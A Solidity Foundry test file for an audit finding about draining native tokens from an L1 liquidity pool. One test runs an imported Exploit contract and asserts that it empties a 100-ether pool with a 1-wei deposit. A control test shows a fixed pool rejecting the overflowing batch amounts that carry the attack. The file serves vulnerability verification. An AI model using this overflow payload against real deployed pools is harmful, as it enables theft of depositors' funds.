// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    PoolFixed
} from "./60700-native-tokens-from-the-l1-liquidity-pools-could-be-drained-d.sol";

contract Finding60700Test is Test {
    function test_exploit_wrap_drains_the_pool() public {
        Exploit e = new Exploit();
        e.pool().deposit{value: 100 ether}();
        assertEq(address(e.pool()).balance, 100 ether);
        e.run{value: 1}();
        assertEq(address(e).balance, 100 ether, "attacker did not receive the LP ETH");
        assertEq(address(e.pool()).balance, 1, "pool was not emptied to 1 wei");
        assertEq(e.pool().lpDeposits(address(this)), 100 ether, "LP accounting was cleared");
    }

    function test_control_checked_add_keeps_the_pool() public {
        PoolFixed pool = new PoolFixed();
        pool.deposit{value: 100 ether}();
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100 ether;
        amounts[1] = type(uint256).max - 100 ether + 2;
        (bool ok,) = address(pool).call{value: 1}(
            abi.encodeWithSelector(PoolFixed.clientDepositL1Batch.selector, amounts)
        );
        assertFalse(ok, "wrapping deposit was accepted");
        assertEq(address(pool).balance, 100 ether, "LP ETH moved");
    }
}
